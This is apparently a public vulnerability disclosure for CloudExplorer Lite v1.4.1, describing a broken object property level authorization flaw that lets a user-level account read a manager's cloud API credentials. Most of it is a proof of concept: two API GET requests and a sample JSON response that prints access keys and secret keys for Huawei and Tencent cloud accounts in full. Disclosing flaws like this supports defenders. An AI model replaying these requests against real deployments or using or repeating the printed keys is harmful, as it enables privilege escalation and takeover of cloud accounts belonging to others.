# Exploit Title: CloudExplorer Lite v1.4.1 - Broken Object Property Level Authorization(BOPLA)
## Date: 12/3/2023
## Vendor Homepage: https://github.com/CloudExplorer-Dev/CloudExplorer-Lite/releases/tag/v1.4.1
## Tested on: Ubuntu, CentOS
## Vendor: CloudExplorer Lite
## Version: v1.4.1
## Exploit Description:
## CloudExplorer Lite v1.4.1 suffers from BOPLA - Broken Object Property Level Authorization Vulnerability allowing attackers(at the user-level) to use Burp Suite to access elastic compute service's api key which has full access to the account owned by manager(vertical privilege escalation). The vulnerability occurs when users select cloud accounts to create cloud hosts.

## -----------------------------------------------POC-------------------------------------------------------------------
```
Request:
GET /management-center/api/cloud_account/page?currentPage=1&pageSize=10 HTTP/2
or:GET /vm-service/api/server/catalog/goods HTTP/1.1

Response:
"records":[
    {
        "id":
        "a55db3fe3b5226348b8e342b0de6dd7e",
        "name":"华为云测试—只读权限",
        "platform":"fit2cloud_huawei_platform",
        "credential":
        "{\"ak\":\"4YZB2GCAKE5KUGJGRJGB\",\"sk\":\"ppgeyoYacUpkJCF7xXiFEs1dzLUrNiWut3DF74jN\"}",
        "state":true,
        "status":"SUCCESS",
        "createTime":"2023-04-10 15:41:40",
        "updateTime":"2023-12-03 20:00:00"},
        {"id":"afb99206f90eadcf8ce647025f9772d3",
        "name":"腾讯云测试—只读权限",
        "platform":"fit2cloud_tencent_platform",
        "credential":"{\"secretId\":\"AKIDSaPqHb1RmGckMeopVsBKON9lFZ6LaeQ1\",\"secretKey\":\"V9dv560pcJMG1d6WDoHdy9PXWQOFbp1B\"}",
        "state":true,
        "status":"SUCCESS",
        "createTime":"2023-04-10 15:48:55",
        "updateTime":"2023-12-03 19:30:00"
    }
]
```
